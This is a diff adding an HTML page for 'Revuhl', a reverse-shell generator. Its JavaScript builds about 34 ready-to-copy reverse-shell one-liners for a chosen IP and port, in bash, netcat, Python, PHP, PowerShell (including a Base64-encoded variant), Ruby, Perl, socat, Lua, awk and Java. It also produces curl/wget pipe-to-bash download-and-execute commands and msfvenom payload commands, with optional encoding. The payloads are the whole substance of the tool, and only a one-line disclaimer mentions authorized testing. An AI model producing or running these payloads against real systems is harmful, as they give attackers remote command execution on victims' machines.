@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Revuhl — Reverse Shell Generator</title>
+<style>
+  :root {
+    --bg: #0d1117;
+    --surface: #161b22;
+    --border: #30363d;
+    --text: #e6edf3;
+    --muted: #8b949e;
+    --accent: #58a6ff;
+    --accent-hover: #79c0ff;
+    --green: #3fb950;
+    --red: #f85149;
+    --code-bg: #0d1117;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    padding: 2rem 1rem;
+  }
+  .container { max-width: 1200px; margin: 0 auto; }
+  h1 { font-size: 1.8rem; margin-bottom: .25rem; }
+  h1 span { color: var(--accent); }
+  .subtitle { color: var(--muted); margin-bottom: 1.5rem; font-size: .9rem; }
+
+  /* Top config bar */
+  .config-bar {
+    display: flex; gap: .75rem; flex-wrap: wrap;
+    margin-bottom: 1.25rem; align-items: flex-end;
+  }
+  .input-group { display: flex; flex-direction: column; gap: .3rem; }
+  .input-group label {
+    font-size: .75rem; color: var(--muted);
+    text-transform: uppercase; letter-spacing: .05em;
+  }
+  .input-group input, .input-group select {
+    background: var(--surface); border: 1px solid var(--border);
+    color: var(--text); padding: .5rem .7rem; border-radius: 6px;
+    font-size: .9rem; outline: none; transition: border-color .2s;
+  }
+  .input-group input:focus, .input-group select:focus { border-color: var(--accent); }
+  .input-group input::placeholder { color: var(--muted); }
+
+  /* Listener inline in config bar */
+  .listener-pill {
+    display: flex; align-items: center; gap: .5rem;
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: 6px; padding: .5rem .85rem; cursor: pointer;
+    transition: border-color .15s; margin-left: auto;
+  }
+  .listener-pill:hover { border-color: var(--muted); }
+  .listener-pill .lbl {
+    font-size: .7rem; color: var(--muted);
+    text-transform: uppercase; letter-spacing: .05em;
+  }
+  .listener-pill .cmd {
+    font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+    font-size: .85rem; color: var(--green);
+  }
+  .listener-pill.copied { border-color: var(--green); }
+
+  /* Two-column: shell list left, output right */
+  .workspace {
+    display: flex; gap: 1.25rem;
+    height: calc(100vh - 14rem);
+    min-height: 400px;
+  }
+
+  /* Left — shell list */
+  .shell-list {
+    width: 240px; flex-shrink: 0;
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: 8px; display: flex; flex-direction: column;
+    overflow: hidden; height: 100%;
+  }
+  .shell-list-header {
+    padding: .6rem 1rem; font-size: .75rem; color: var(--muted);
+    text-transform: uppercase; letter-spacing: .05em;
+    border-bottom: 1px solid var(--border); flex-shrink: 0;
+  }
+  .shell-list-scroll {
+    overflow-y: auto; flex: 1;
+    scrollbar-width: thin;
+    scrollbar-color: var(--border) transparent;
+  }
+  .shell-list-scroll::-webkit-scrollbar { width: 6px; }
+  .shell-list-scroll::-webkit-scrollbar-track { background: transparent; }
+  .shell-list-scroll::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  .shell-list-scroll::-webkit-scrollbar-thumb:hover { background: var(--muted); }
+
+  .shell-item {
+    padding: .55rem 1rem; font-size: .85rem;
+    cursor: pointer; color: var(--text);
+    transition: all .1s; border-left: 3px solid transparent;
+    user-select: none;
+  }
+  .shell-item:hover {
+    background: rgba(255,255,255,.04);
+    border-left-color: var(--muted);
+  }
+  .shell-item.active {
+    background: rgba(88,166,255,.08);
+    border-left-color: var(--accent);
+    color: var(--accent);
+  }
+
+  /* Right — output */
+  .output-panel {
+    flex: 1; min-width: 0;
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: 8px; display: flex; flex-direction: column;
+    overflow: hidden; height: 100%;
+  }
+  .output-header {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: .6rem 1rem; border-bottom: 1px solid var(--border);
+    flex-shrink: 0;
+  }
+  .output-title { font-size: .85rem; font-weight: 600; }
+  .output-tag {
+    font-size: .7rem; padding: .15rem .5rem; border-radius: 99px;
+    background: rgba(88,166,255,.12); color: var(--accent);
+  }
+  .output-body {
+    position: relative; flex: 1; display: flex; flex-direction: column;
+  }
+  .output-body pre {
+    margin: 0; padding: 1rem; padding-right: 4.5rem; overflow: auto;
+    font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+    font-size: .85rem; line-height: 1.6; color: var(--text);
+    background: var(--code-bg); white-space: pre-wrap; word-break: break-all;
+    flex: 1;
+  }
+  .output-body .copy-btn {
+    position: absolute; top: .5rem; right: .5rem;
+    background: var(--surface); border: 1px solid var(--border);
+    color: var(--muted); padding: .35rem .7rem; border-radius: 5px;
+    cursor: pointer; font-size: .75rem; transition: all .15s;
+  }
+  .output-body .copy-btn:hover { color: var(--text); border-color: var(--muted); }
+  .output-body .copy-btn.copied { color: var(--green); border-color: var(--green); }
+
+  .empty-state {
+    display: flex; align-items: center; justify-content: center;
+    flex: 1; color: var(--muted); font-size: .85rem; padding: 1rem;
+  }
+
+  footer {
+    text-align: center; color: var(--muted);
+    font-size: .75rem; margin-top: 2rem;
+  }
+
+  /* Responsive */
+  @media (max-width: 760px) {
+    .workspace { flex-direction: column; min-height: auto; }
+    .shell-list { width: 100%; max-height: 240px; }
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <h1><span>Revuhl</span> — Reverse Shell Generator</h1>
+  <p class="subtitle">For authorized penetration testing and security assessments only.</p>
+
+  <!-- Top bar: IP, Port, Encoding, Listener -->
+  <div class="config-bar">
+    <div class="input-group">
+      <label for="ip">IP Address</label>
+      <input type="text" id="ip" placeholder="10.10.14.1" spellcheck="false" style="width:200px">
+    </div>
+    <div class="input-group">
+      <label for="port">Port</label>
+      <input type="text" id="port" placeholder="4444" spellcheck="false" style="width:100px">
+    </div>
+    <div class="input-group">
+      <label for="encoding">Encoding</label>
+      <select id="encoding" style="width:140px">
+        <option value="none">None</option>
+        <option value="base64">Base64</option>
+        <option value="url">URL Encode</option>
+      </select>
+    </div>
+    <div class="listener-pill" id="listener-pill" title="Click to copy">
+      <span class="lbl">Listener</span>
+      <span class="cmd" id="listener-cmd">nc -lvnp 4444</span>
+    </div>
+  </div>
+
+  <!-- Shell list (left) + Output (right) -->
+  <div class="workspace">
+    <div class="shell-list">
+      <div class="shell-list-header">Reverse Shells</div>
+      <div class="shell-list-scroll" id="shell-list"></div>
+    </div>
+    <div class="output-panel">
+      <div class="output-header">
+        <span class="output-title" id="output-title">Select a shell &larr;</span>
+        <span class="output-tag" id="output-tag"></span>
+      </div>
+      <div class="output-body" id="output-body">
+        <div class="empty-state">Pick a reverse shell from the list</div>
+      </div>
+    </div>
+  </div>
+
+  <footer>Revuhl &mdash; Use responsibly and only with proper authorization.</footer>
+</div>
+
+<script>
+(function () {
+  "use strict";
+
+  const ipEl        = document.getElementById("ip");
+  const portEl      = document.getElementById("port");
+  const encodingEl  = document.getElementById("encoding");
+  const shellListEl = document.getElementById("shell-list");
+  const outputTitle = document.getElementById("output-title");
+  const outputTag   = document.getElementById("output-tag");
+  const outputBody  = document.getElementById("output-body");
+  const listenerEl  = document.getElementById("listener-cmd");
+  const listenerPill = document.getElementById("listener-pill");
+
+  /* ── shell definitions ── */
+  const shells = [
+    { name: "Bash -i",          fn: (ip, p) => `bash -i >& /dev/tcp/${ip}/${p} 0>&1` },
+    { name: "Bash read",        fn: (ip, p) => `0<&196;exec 196<>/dev/tcp/${ip}/${p}; bash <&196 >&196 2>&196` },
+    { name: "Bash 5",           fn: (ip, p) => `bash -i 5<> /dev/tcp/${ip}/${p} 0<&5 1>&5 2>&5` },
+    { name: "Bash UDP",         fn: (ip, p) => `bash -i >& /dev/udp/${ip}/${p} 0>&1` },
+    { name: "nc -e",            fn: (ip, p) => `nc ${ip} ${p} -e /bin/bash` },
+    { name: "nc -c",            fn: (ip, p) => `nc -c /bin/bash ${ip} ${p}` },
+    { name: "nc mkfifo",        fn: (ip, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ${ip} ${p} >/tmp/f` },
+    { name: "nc -i (OpenBSD)",  fn: (ip, p) => `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${p} >/tmp/f` },
+    { name: "ncat (SSL)",       fn: (ip, p) => `ncat --ssl ${ip} ${p} -e /bin/bash` },
+    { name: "BusyBox nc",       fn: (ip, p) => `busybox nc ${ip} ${p} -e /bin/sh` },
+    { name: "Python3",          fn: (ip, p) => `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ip}",${p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'` },
+    { name: "Python3 subprocess", fn: (ip, p) => `python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("${ip}",${p}));subprocess.call(["/bin/bash","-i"],stdin=s,stdout=s,stderr=s)'` },
+    { name: "Python2",          fn: (ip, p) => `python -c 'import os,pty,socket;s=socket.socket();s.connect(("${ip}",${p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'` },
+    { name: "PHP exec",         fn: (ip, p) => `php -r '$sock=fsockopen("${ip}",${p});exec("/bin/bash -i <&3 >&3 2>&3");'` },
+    { name: "PHP proc_open",    fn: (ip, p) => `php -r '$sock=fsockopen("${ip}",${p});$proc=proc_open("/bin/bash -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'` },
+    { name: "PHP system",       fn: (ip, p) => `php -r '$sock=fsockopen("${ip}",${p});while($cmd=fgets($sock)){$output=shell_exec($cmd);fwrite($sock,$output);}'` },
+    { name: "PowerShell #1",    fn: (ip, p) => `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${ip}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"` },
+    { name: "PowerShell #2 (Base64)", fn: (ip, p) => {
+      const inner = `$c=New-Object Net.Sockets.TCPClient('${ip}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()`;
+      return `powershell -nop -enc ${btoa(unescape(encodeURIComponent(inner)))}`;
+    }},
+    { name: "CMD",              fn: (ip, p) => `cmd.exe /c "start /b powershell -nop -c \\"$c=New-Object Net.Sockets.TCPClient('${ip}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()\\""` },
+    { name: "curl + bash",      fn: (ip, p) => `curl http://${ip}:${p}/shell.sh | bash` },
+    { name: "wget + bash",      fn: (ip, p) => `wget -qO- http://${ip}:${p}/shell.sh | bash` },
+    { name: "Ruby",             fn: (ip, p) => `ruby -rsocket -e'spawn("/bin/bash",[:in,:out,:err]=>TCPSocket.new("${ip}",${p}))'` },
+    { name: "Ruby fork",        fn: (ip, p) => `ruby -rsocket -e'exit if fork;c=TCPSocket.new("${ip}",${p});loop{c.gets.chomp!;(IO.popen($$_,"r"){|io|c.print io.read})rescue nil}'` },
+    { name: "Perl",             fn: (ip, p) => `perl -e 'use Socket;$i="${ip}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'` },
+    { name: "Perl no sh",       fn: (ip, p) => `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${ip}:${p}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'` },
+    { name: "Socat",            fn: (ip, p) => `socat TCP:${ip}:${p} EXEC:/bin/bash` },
+    { name: "Socat TTY",        fn: (ip, p) => `socat TCP:${ip}:${p} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane` },
+    { name: "Lua",              fn: (ip, p) => `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${p}');os.execute('/bin/bash -i <&3 >&3 2>&3');"` },
+    { name: "Awk",              fn: (ip, p) => `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${p}"; while(42) { do{ printf "$ " |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null` },
+    { name: "Java",             fn: (ip, p) => `Runtime r = Runtime.getRuntime(); Process p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${p};cat <&5 | while read line; do $line 2>&5 >&5; done"}); p.waitFor();` },
+    { name: "xterm",            fn: (ip, p) => `xterm -display ${ip}:1` },
+    { name: "msfvenom (linux staged)", fn: (ip, p) => `msfvenom -p linux/x64/shell/reverse_tcp LHOST=${ip} LPORT=${p} -f elf -o rev.elf` },
+    { name: "msfvenom (linux)",  fn: (ip, p) => `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${ip} LPORT=${p} -f elf -o rev.elf` },
+    { name: "msfvenom (windows)", fn: (ip, p) => `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip} LPORT=${p} -f exe -o rev.exe` },
+  ];
+
+  let selectedIdx = null;
+  const itemEls = [];
+
+  /* ── build shell list ── */
+  shells.forEach((s, i) => {
+    const item = document.createElement("div");
+    item.className = "shell-item";
+    item.textContent = s.name;
+    item.addEventListener("click", () => selectShell(i));
+    shellListEl.appendChild(item);
+    itemEls[i] = item;
+  });
+
+  /* ── selection ── */
+  function selectShell(idx) {
+    selectedIdx = idx;
+    itemEls.forEach((el, i) => el.classList.toggle("active", i === idx));
+    render();
+  }
+
+  /* ── helpers ── */
+  function sanitize(text) {
+    const el = document.createElement("span");
+    el.textContent = text;
+    return el.innerHTML;
+  }
+
+  function encode(raw, method) {
+    if (method === "base64") return btoa(unescape(encodeURIComponent(raw)));
+    if (method === "url") return encodeURIComponent(raw);
+    return raw;
+  }
+
+  function copyText(text, btn) {
+    navigator.clipboard.writeText(text).then(() => {
+      const orig = btn.textContent;
+      btn.textContent = "Copied!";
+      btn.classList.add("copied");
+      setTimeout(() => { btn.textContent = orig; btn.classList.remove("copied"); }, 1500);
+    });
+  }
+
+  /* ── render output ── */
+  function render() {
+    const ip   = ipEl.value.trim() || "10.10.14.1";
+    const port = portEl.value.trim() || "4444";
+    const enc  = encodingEl.value;
+
+    listenerEl.textContent = `nc -lvnp ${port}`;
+
+    if (selectedIdx === null) {
+      outputTitle.innerHTML = "Select a shell &larr;";
+      outputTag.textContent = "";
+      outputBody.innerHTML = '<div class="empty-state">Pick a reverse shell from the list</div>';
+      return;
+    }
+
+    const s = shells[selectedIdx];
+    const raw = s.fn(ip, port);
+    const display = encode(raw, enc);
+
+    outputTitle.textContent = s.name;
+    outputTag.textContent = "";
+    outputBody.innerHTML = `
+      <pre>${sanitize(display)}</pre>
+      <button class="copy-btn" title="Copy to clipboard">Copy</button>`;
+    outputBody.querySelector(".copy-btn").addEventListener("click", function () {
+      copyText(display, this);
+    });
+  }
+
+  /* ── events ── */
+  listenerPill.addEventListener("click", function () {
+    copyText(listenerEl.textContent, this);
+  });
+
+  [ipEl, portEl, encodingEl].forEach(el => el.addEventListener("input", render));
+
+  /* Select first shell by default */
+  selectShell(0);
+})();
+</script>
+</body>
+</html>
